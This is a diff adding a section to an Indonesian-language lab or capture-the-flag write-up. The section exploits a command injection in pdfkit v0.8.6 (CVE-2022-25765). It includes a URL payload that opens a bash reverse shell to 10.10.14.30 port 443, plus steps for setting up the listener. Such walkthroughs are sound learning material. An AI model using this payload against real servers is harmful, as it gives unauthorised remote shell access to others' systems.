@@ -25,8 +25,31 @@ Didapati file pdf sebagai berikut, yang bila dibuka akan menampilkan list direct
 Setelah itu analisa file pdf menggunakan **exiftool**, file di analisa menggunakan tool ini karena saya ingin mengetahui meta data dari file atau ada hal yang mencurigakan dari file.   
 ![image](https://user-images.githubusercontent.com/92077284/211996948-fb392098-7706-4054-8e85-0d6e1068d64f.png)  
 Disini saya memanfaatkan **pdfkit v0.8.6** sebagai celah untuk masuk kedalam sistem, pdfkit adalah _PDF document generation library_ untuk browser, yang fungsinya memudahkan browser membuat file, namun pada versi ini terdapat celah kerentanan dimana kita dapat melakukan _Command Injection_ karena URL tidak di sanitasi.  
+
 **CVE-2022–25765** Source: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795  
-Dari situ dapat dibuat sebuah _reverse shell_ 
+Dari situ dapat dibuat sebuah _reverse shell_ dengan bantuan **Hack-Tools**  
+**Hack-Tools** = https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi  
+![image](https://user-images.githubusercontent.com/92077284/213356703-8097f1a2-5a5f-498d-9ece-69cbb88491eb.png)  
+
+```
+http://example.com/?name=#{'%20`sleep 5`'}
+http://example.com/?name=#{'%20``'}
+```
+menjadi   
+```
+http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
+```
+Untuk memulai tahapannya, pertama coba untuk _listen_ pada port 443  
+![image](https://user-images.githubusercontent.com/92077284/213357167-d793b9f5-d2eb-4dfc-b7f7-adae4d6ca264.png)  
+lalu buat _payload_ dan masukan kedalam website, untuk melakukan _command injection_  
+```
+http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
+```
+![image](https://user-images.githubusercontent.com/92077284/213357672-62b90aeb-1762-418d-9e22-edc9fa001afb.png)  
+lalu aktivitas akan terekam pada terminal yang tadi  
+
+
+
 
 ## a
 ## a
